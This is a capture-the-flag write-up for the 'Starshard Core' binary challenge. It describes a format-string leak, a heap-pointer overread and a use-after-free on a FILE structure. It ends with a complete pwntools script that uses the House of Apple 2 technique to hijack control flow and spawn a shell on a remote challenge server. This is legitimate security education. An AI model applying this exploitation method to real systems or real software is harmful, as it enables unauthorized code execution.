Here is the formatted writeup for **Starshard Core**.

---

# Starshard Core

> **Description:** In the snow-glittered workshops of Tinselwick, a curious “Starshard Console” is used to arm tiny routines and stitch wish-scripts into the Great Snowglobe’s heart. Each tinkerer signs in, names their ritual, and feeds a fragment of magic to be etched into the Starshard Core’s log. But rumors say the console was built with a mischievous shortcut—one that lets the Gingerbit Gremlin slip through the cracks if you greet it just the wrong way. Your job is to find that crack, and coax the console into opening a door it was never meant to show.

## Initial Analysis

We are provided with a binary and `libc-2.24`. Let's analyze the binary in Ghidra to understand the workflow.

### Main Function

The main loop presents us with a menu. Crucially, it asks for a "Tinkerer Name" at the start.

```c
/* Truncated main function */
printf("Tinselwick Tinkerer Name: ");
pcVar2 = fgets(console_state.tinkerer_name, 0x10, stdin);
// ...
printf("=== Welcome ");
printf(console_state.tinkerer_name); // <--- VULNERABILITY 1: Format String

```

We immediately spot a **Format String Vulnerability** in the greeting. Since we can read 16 bytes, we can use `%p` specifiers to leak addresses from the stack.

### The Menu Functions

The program manages a `console_state` structure containing a file pointer (`core_log`) and a buffer for "fragments".

1. **`arm_routine`**: Opens a file (`fopen`) and assigns the pointer to `console_state.core_log`. It also asks for a spell name.
* **Vulnerability 2 (Buffer Overread):** It reads 24 bytes for the name but prints it without ensuring a null terminator. Since the `core_log` file pointer resides immediately after the name in memory, filling the name buffer allows us to leak the heap address of the file structure.


2. **`feed_fragment`**: Allocates memory (`malloc`) based on user input size and reads data into it.
3. **`commit_routine`**: Writes the fragment to the file using `fputs`.
4. **`cancel_routine`**: Closes the file.
```c
void cancel_routine(void) {
  if (console_state.core_log != 0) {
    fclose(console_state.core_log);
    // Dangling pointer! console_state.core_log is not set to NULL
    puts("[*] Routine Cancelled.");
  }
}

```


* **Vulnerability 3 (Use-After-Free):** `fclose` frees the `FILE` structure on the heap, but the global pointer `console_state.core_log` is never nulled out.



### The Goal

There is a "win" function provided:

```c
void ginger_gate(void) {
  setenv("XMAS","The Gingerbit Gremlin listens.",1);
  system("/bin/sh");
}

```

## Exploitation Strategy

Our path to the shell involves utilizing the Use-After-Free (UAF) to overwrite the freed `FILE` structure with a fake one, hijacking control flow to execute `ginger_gate`.

### 1. Information Leakage

We need three addresses to bypass protections (PIE, ASLR) and construct our fake file:

1. **Libc Base:** Leaked via the Format String (Offset 9 on the stack).
2. **PIE Base:** Leaked via the Format String (Offset 11 on the stack) to calculate the address of `ginger_gate`.
3. **Heap Address:** Leaked via the Buffer Overread in `arm_routine`.

### 2. Heap Feng Shui (UAF)

The `FILE` structure used by `fopen` is allocated on the heap.

1. Call `arm_routine` to allocate the `FILE` struct.
2. Call `cancel_routine` to `free()` it. The pointer remains dangling.
3. Call `feed_fragment` to `malloc()` a chunk of the same size. The allocator (handling fastbins/tcache) will return the exact same chunk that used to hold the `FILE` struct.
4. We write our payload into this chunk, effectively creating a fake `FILE` object pointed to by the dangling `core_log`.

### 3. File Structure Exploitation (House of Apple 2)

We will use the **House of Apple 2** technique. This technique abuses the `_IO_FILE` structure, specifically the `_wide_data` and vtables, to hijack execution when a file operation (like `fputs` in `commit_routine`) is performed.

**The Chain:**

1. We overwrite the object's vtable pointer to point to `_IO_wfile_jumps` (inside libc).
2. This forces functions like `fputs` to use "Wide Character" logic, jumping to `_IO_wfile_overflow`.
3. `_IO_wfile_overflow` attempts to allocate a buffer by calling `_IO_wdoallocbuf`.
4. `_IO_wdoallocbuf` calls a function pointer located at `offset 0x68` of the `_wide_vtable`.
5. We control the `_wide_data` pointer to point to our fake data, and the `_wide_vtable` to point to a fake table where `offset 0x68` is the address of `ginger_gate`.

## The Exploit Script

```python
from pwn import *

# Context setup
context.log_level = 'debug'
exe = ELF("./starshard_core")
libc = ELF("./glibc/libc.so.6") # Ensure this matches remote libc
context.binary = exe

# p = process("./starshard_core")
p = remote('154.57.164.65', 31764)

p.recvuntil(b"Name: ")

# ==========================================================
# STEP 1: Leak PIE and Libc Base (Format String)
# ==========================================================
# Offsets 9 and 11 determined via dynamic analysis
p.sendline(b"%9$p%11$p")

p.recvuntil(b"Welcome ")
raw_leak = p.recvline().strip()
parts = raw_leak.split(b"0x")

libc_leak = int(parts[1], 16)
pie_leak  = int(parts[2].split()[0], 16)

# Calculate bases using offsets found during analysis
exe.address = pie_leak - 0x175e
libc.address = libc_leak - 0x2dfd0

print(f"Libc Base: {hex(libc.address)}")
print(f"PIE Base:  {hex(exe.address)}")

# ==========================================================
# STEP 2: Leak Heap Address (Buffer Overread)
# ==========================================================
p.recvuntil(b'> ')
p.sendline(b'1') # Arm Routine

# Send 24 bytes to fill the buffer up to the file pointer
p.sendlineafter(b"Name: ", b"A"*24)
p.recvuntil(b"A"*24)

# Read the leaked pointer immediately following our buffer
heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
heap_base = heap_leak & ~0xfff
print(f"Heap Leak: {hex(heap_leak)}")

# ==========================================================
# STEP 3: Trigger UAF and House of Apple 2
# ==========================================================
# Free the FILE chunk
p.sendlineafter(b"> ", b"3") # Cancel Routine

# Calculate target addresses
target_func = exe.symbols['ginger_gate']
vtable = libc.sym['_IO_wfile_jumps'] 

# Fake pointers relative to our heap leak
# The leak points to the start of the FILE struct
safe_ptr = heap_leak + 0x40          # Location for lock (needs to be writable/zero)
fake_wide_data = heap_leak + 0xE0    # Fake _wide_data struct location
fake_wide_vtable = heap_leak + 0x150 # Fake _wide_vtable location

# Construct the fake FILE structure
payload = flat({
    0x00: "  sh",              # Padding / command
    0x28: 0,                   # _IO_write_ptr
    0x88: safe_ptr,            # _lock
    0xA0: fake_wide_data,      # _wide_data pointer
    0xD8: vtable,              # vtable pointer -> _IO_wfile_jumps
    
    # Fake _wide_data structure at offset 0xE0
    0xE0 + 0x18: 0,  # _IO_write_base
    0xE0 + 0x20: 0,  # _IO_write_ptr
    0xE0 + 0x28: 0,  # _IO_write_end
    0xE0 + 0x30: 0,  # _IO_buf_base
    0xE0 + 0xE0: fake_wide_vtable, # Pointer to our fake wide vtable
    
    # Fake wide vtable at offset 0x150
    # _IO_wdoallocbuf calls function at offset 0x68
    0x150 + 0x68: target_func 

}, filler=b'\x00', length=464)

# Re-allocate the freed chunk via malloc
p.sendlineafter(b"> ", b"2") # Feed Fragment
p.sendlineafter(b"Size: ", b"470") # Request size large enough to get the FILE chunk
p.sendlineafter(b"Fragment:", payload)

# Trigger file operation (fputs) to execute payload
p.sendlineafter(b"> ", b"4") # Commit Routine

p.interactive()

```